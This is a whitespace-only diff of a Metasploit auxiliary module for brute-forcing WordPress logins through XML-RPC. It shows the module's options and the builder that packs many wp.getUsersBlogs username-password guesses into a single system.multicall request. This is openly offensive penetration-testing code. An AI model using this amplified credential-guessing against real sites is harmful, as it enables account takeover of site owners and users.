@@ -16,26 +16,26 @@ class Metasploit3 < Msf::Auxiliary
             'Description'  => %q{Wordpress Massive Burteforce attacks via wordpress XMLRPC service.},
             'License'      => MSF_LICENSE,
             'Author'       =>
-                [
-                  'Sabri (@KINGSABRI)',           # Module Writer
-                  'William (WCoppola@Lares.com)'  # Module Requester
-                ],
+              [
+                'Sabri (@KINGSABRI)',           # Module Writer
+                'William (WCoppola@Lares.com)'  # Module Requester
+              ],
             'References'   =>
-                [
-                  ['URL', 'https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/'],
-                  ['URL', 'https://blog.sucuri.net/2014/07/new-brute-force-attacks-exploiting-xmlrpc-in-wordpress.html']
-                ]
+              [
+                ['URL', 'https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/'],
+                ['URL', 'https://blog.sucuri.net/2014/07/new-brute-force-attacks-exploiting-xmlrpc-in-wordpress.html']
+              ]
           ))
 
     register_options(
-        [
-          OptString.new('TARGETURI', [true, 'The base path', '/']),
-          OptPath.new('WPUSER_FILE', [true, 'File containing usernames, one per line',
-                                      File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
-          OptPath.new('WPPASS_FILE', [true, 'File containing passwords, one per line',
-                                      File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt")]),
-          OptInt.new('BLOCKEDWAIT', [true, 'Time(minutes) to wait if got blocked', 6])
-        ], self.class)
+      [
+        OptString.new('TARGETURI', [true, 'The base path', '/']),
+        OptPath.new('WPUSER_FILE', [true, 'File containing usernames, one per line',
+                                    File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
+        OptPath.new('WPPASS_FILE', [true, 'File containing passwords, one per line',
+                                    File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt")]),
+        OptInt.new('BLOCKEDWAIT', [true, 'Time(minutes) to wait if got blocked', 6])
+      ], self.class)
   end
 
   def usernames
@@ -60,31 +60,31 @@ class Metasploit3 < Msf::Auxiliary
         xml.methodCall {
           xml.methodName("system.multicall")
           xml.params {
-          xml.param {
-          xml.value {
-          xml.array {
-          xml.data {
+            xml.param {
+              xml.value {
+                xml.array {
+                  xml.data {
 
-        pass_group.each  do |pass|
-          xml.value {
-          xml.struct {
-          xml.member {
-          xml.name("methodName")
-          xml.value { xml.string("wp.getUsersBlogs") }}
-            xml.member {
-            xml.name("params")
-            xml.value {
-            xml.array {
-            xml.data {
-            xml.value {
-            xml.array {
-              xml.data {
-                xml.value { xml.string(user) }
-                xml.value { xml.string(pass) }
-          }}}}}}}}}
-        end
+                    pass_group.each  do |pass|
+                      xml.value {
+                        xml.struct {
+                          xml.member {
+                            xml.name("methodName")
+                            xml.value { xml.string("wp.getUsersBlogs") }}
+                          xml.member {
+                            xml.name("params")
+                            xml.value {
+                              xml.array {
+                                xml.data {
+                                  xml.value {
+                                    xml.array {
+                                      xml.data {
+                                        xml.value { xml.string(user) }
+                                        xml.value { xml.string(pass) }
+                                      }}}}}}}}}
+                    end
 
-          }}}}}}
+                  }}}}}}
       end
 
       xml_payloads << document.to_xml
@@ -174,5 +174,5 @@ class Metasploit3 < Msf::Auxiliary
           sleep 2
         end
 
-  end end end
+      end end end
 end
